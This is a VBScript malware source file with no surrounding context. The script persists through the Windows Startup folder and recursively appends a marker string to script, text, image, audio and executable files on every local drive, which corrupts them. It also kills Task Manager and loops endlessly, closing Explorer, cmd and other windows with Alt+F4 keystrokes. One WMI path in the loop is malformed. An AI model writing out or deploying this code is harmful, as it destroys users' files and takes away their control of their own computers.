Set objFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = WScript.CreateObject("WScript.Shell")

' Define the list of file extensions to infect
extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2", "EXE", "TXT")

' Define the list of processes to close
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

' Add script to Startup folder
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

' Get the list of drives on the system
Set drives = objFSO.Drives

' Iterate through each drive
For Each drive In drives
    ' Check if the drive is ready and not a network drive
    If drive.IsReady And Not drive.DriveType = 4 Then
        ' Get the root folder of the drive
        Set folder = objFSO.GetFolder(drive.RootFolder)

        ' Recursively infect files in the folder and its subfolders
        InfectFiles folder
    End If
Next

' Function to infect files in a folder and its subfolders
Sub InfectFiles(folder)
    ' Iterate through each file in the folder
    For Each file In folder.Files
        ' Check if the file has a matching extension
        If HasMatchingExtension(file) Then
            ' Open the file for reading
            Set objFile = objFSO.OpenTextFile(file.Path)

            ' Read the content of the file
            content = objFile.ReadAll

            ' Close the file
            objFile.Close

            ' Check if the file is not already infected
            If InStr(content, "VIRUS_PAYLOAD") = 0 Then
                ' Append the virus payload to the file content
                infectedContent = content & vbCrLf & "VIRUS_PAYLOAD"

                ' Open the file for writing
                Set objFile = objFSO.OpenTextFile(file.Path, 2)

                ' Write the infected content to the file
                objFile.Write infectedContent

                ' Close the file
                objFile.Close
            End If
        End If
    Next

    ' Recursively infect files in subfolders
    For Each subfolder In folder.Subfolders
        InfectFiles subfolder
    Next
End Sub

' Function to check if a file has a matching extension
Function HasMatchingExtension(file)
    ext = objFSO.GetExtensionName(file.Path)

    For Each extension In extensions
        If LCase(ext) = LCase(extension) Then
            HasMatchingExtension = True
            Exit Function
        End If
    Next

    HasMatchingExtension = False
End Function

' Check if Task Manager is running, and if so, close it
Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
If colProcessList.Count > 0 Then
    For Each objProcess In colProcessList
        objProcess.Terminate()
    Next
End If

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\.\root\cimv2")
Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
            If colProcessList.Count > 0 Then
        For Each objProcess In colProcessList
            WshShell.AppActivate objProcess.ProcessId
            WScript.Sleep 0 ' Wait for window to activate before closing
            WshShell.SendKeys "%{F4}" ' Sends Alt+F4 to close window
        Next
    End If
Next

' Type "n" into the search bar with focus
WshShell.SendKeys "n"

WScript.Sleep 0 ' Wait before checking again
Loop
